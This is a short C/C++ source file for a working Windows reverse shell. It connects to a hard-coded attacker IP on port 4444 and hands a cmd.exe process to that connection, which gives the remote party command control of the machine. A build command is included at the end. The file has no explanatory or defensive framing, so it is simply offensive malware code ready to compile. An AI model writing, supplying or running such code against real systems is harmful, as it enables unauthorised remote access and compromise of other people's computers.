#include <winsock2.h>
#include <stdio.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

WSADATA wsaData;
struct sockaddr_in sock_in;
STARTUPINFOW startup_info;
PROCESS_INFORMATION pi;

int main(int argc, char* argv[])
{
    // Attacker IP and Port
    const char* ip = "192.168.216.128"; 
    short port = 4444;

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    sock_in.sin_family = AF_INET;
    sock_in.sin_port = htons(port);
    sock_in.sin_addr.s_addr = inet_addr(ip);


    WSAConnect(sock, (SOCKADDR*)&sock_in, sizeof(sock_in), NULL, NULL, NULL, NULL);

    memset(&startup_info, 0, sizeof(startup_info));
    startup_info.cb = sizeof(startup_info);
    startup_info.dwFlags = STARTF_USESTDHANDLES;
    startup_info.hStdInput = startup_info.hStdOutput = startup_info.hStdError = (HANDLE)sock;

    const char* cmd = "cmd.exe";  
    wchar_t cmdWide[256];  

    MultiByteToWideChar(CP_ACP, 0, cmd, -1, cmdWide, 256);

    CreateProcessW(NULL, cmdWide, NULL, NULL, TRUE, 0, NULL, NULL, &startup_info, &pi);

    exit(0);
}

// g++ -o reverse_shell main.cpp -lws2_32